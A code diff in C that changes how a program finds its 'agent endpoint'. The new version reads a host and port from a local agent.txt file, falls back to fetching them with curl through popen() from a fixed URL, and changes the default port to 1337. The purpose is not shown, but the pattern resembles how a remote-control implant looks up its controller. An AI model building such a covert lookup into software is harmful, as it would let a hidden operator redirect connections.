@@ -26,56 +26,73 @@ static void sendline(const char *s)
 
 static int fetch_agent_endpoint(char *out_host, int max_host_len, int *out_port)
 {
-    char cmd[512];
-    snprintf(cmd, sizeof(cmd), "curl -s -m 5 -L \"%s\" 2>/dev/null", AGENT_URL);
+    char line[256] = {0};
+    int has_read = 0;
 
-    FILE *fp = popen(cmd, "r");
-    if (!fp)
+    // 1. Try local agent.txt first
+    FILE *fp = fopen("agent.txt", "r");
+    if (fp)
+    {
+        if (fgets(line, sizeof(line), fp) != NULL)
+        {
+            has_read = 1;
+        }
+        fclose(fp);
+    }
+
+    // 2. If not found or empty, fetch via curl
+    if (!has_read)
+    {
+        char cmd[512];
+        snprintf(cmd, sizeof(cmd), "curl -s -m 5 -L \"%s\" 2>/dev/null", AGENT_URL);
+        FILE *pfp = popen(cmd, "r");
+        if (pfp)
+        {
+            if (fgets(line, sizeof(line), pfp) != NULL)
+            {
+                has_read = 1;
+            }
+            pclose(pfp);
+        }
+    }
+
+    if (!has_read)
     {
         return 0;
     }
 
-    char line[256] = {0};
-    if (fgets(line, sizeof(line), fp) != NULL)
+    char *p = line;
+    while (*p)
     {
-        pclose(fp);
-
-        char *p = line;
-        while (*p)
+        if (*p == '\r' || *p == '\n')
         {
-            if (*p == '\r' || *p == '\n')
-            {
-                *p = '\0';
-                break;
-            }
-            p++;
+            *p = '\0';
+            break;
         }
-
-        if (strlen(line) == 0)
-        {
-            return 0;
-        }
-
-        char *colon = strchr(line, ':');
-        if (colon)
-        {
-            *colon = '\0';
-            strncpy(out_host, line, max_host_len - 1);
-            out_host[max_host_len - 1] = '\0';
-            *out_port = atoi(colon + 1);
-        }
-        else
-        {
-            strncpy(out_host, line, max_host_len - 1);
-            out_host[max_host_len - 1] = '\0';
-            *out_port = 1338;
-        }
-
-        return (*out_port > 0 && strlen(out_host) > 0);
+        p++;
     }
 
-    pclose(fp);
-    return 0;
+    if (strlen(line) == 0)
+    {
+        return 0;
+    }
+
+    char *colon = strchr(line, ':');
+    if (colon)
+    {
+        *colon = '\0';
+        strncpy(out_host, line, max_host_len - 1);
+        out_host[max_host_len - 1] = '\0';
+        *out_port = atoi(colon + 1);
+    }
+    else
+    {
+        strncpy(out_host, line, max_host_len - 1);
+        out_host[max_host_len - 1] = '\0';
+        *out_port = 1337;
+    }
+
+    return (*out_port > 0 && strlen(out_host) > 0);
 }
 
 int main(int argc, char **argv)
